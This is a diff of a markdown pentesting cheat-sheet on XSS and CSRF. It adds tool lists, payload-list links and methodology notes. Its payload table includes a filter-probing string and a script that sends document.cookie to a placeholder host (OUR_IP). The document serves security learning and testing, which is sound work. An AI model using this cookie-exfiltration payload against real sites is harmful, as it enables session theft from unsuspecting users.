@@ -1,13 +1,15 @@
 # XSS and CSRF
 XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side. Of course these vulnerabilities run entirely within the browser's sandbox and is confined to what the browser can do.
 
+XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
+
 # Resources
 - [HTB Cross-Site Scripting (XSS) Module](https://academy.hackthebox.com/module/103/section/965)
 - [HTB Advanced XSS and CSRF Exploitation Module](https://academy.hackthebox.com/module/235/section/2653)
 - [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
 - [PortSwigger Xss](https://portswigger.net/web-security/cross-site-scripting)
 - [HackTricks XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)
-
+  
 # Good Examples
 - [Rook to XSS](https://skii.dev/rook-to-xss/?ref=weekly.infosecwriteups.com)
 - [MySpace Samy worm](https://en.wikipedia.org/wiki/Samy_(computer_worm))
@@ -15,14 +17,25 @@ XSS vulnerabilities take advantage of a flaw in user input sanitization to "writ
 - [Google Search XSS](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
 - [Apache XSS](https://infra.apache.org/blog/apache_org_04_09_2010)
 
+# Tooling
+- [Nessus](https://www.tenable.com/products/nessus)
+- [BurpSuite Pro](https://portswigger.net/burp/pro)
+- [ZAP](https://www.zaproxy.org/)
+- [XSS Strike](https://github.com/s0md3v/XSStrike)
+- [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
+- [XSSer](https://github.com/epsylon/xsser)
+
 # Methodology TLDR
 [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html#methodology)
 1. Check for any value or parameter you control (from input) is being REFLECTED in the page source or being USED by JavaScript in any of it's logic
 2. If reflected (serverside), find it's context (raw HTML / HTML tag / JS code or function) and depending on it's context will dictate what you can or can not do
 3. If used in client-side JavaScript, you could exploit a DOM XSS - pay attention how your input is controlled and if your controlled input is used by any sink.
 
-
 # XSS Testing Payloads
+Code review is the most reliable way to get a XSS rather than throwing automated tooling at a website. Remember to check where your input is presenting itself to understand the context and what will work depending on that.
+- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
+- [PayloadBox](https://github.com/payloadbox/xss-payload-list)
+
 | Description | Code |
 |-------------|------|
 | Check for filtering (See below) | ;:!--''" <SCs>=&{[(`)]}//. |
@@ -41,7 +54,6 @@ XSS vulnerabilities take advantage of a flaw in user input sanitization to "writ
 | Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |
 
 # Notes
-
 ## Stored XSS
 Most critical where the injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.
 
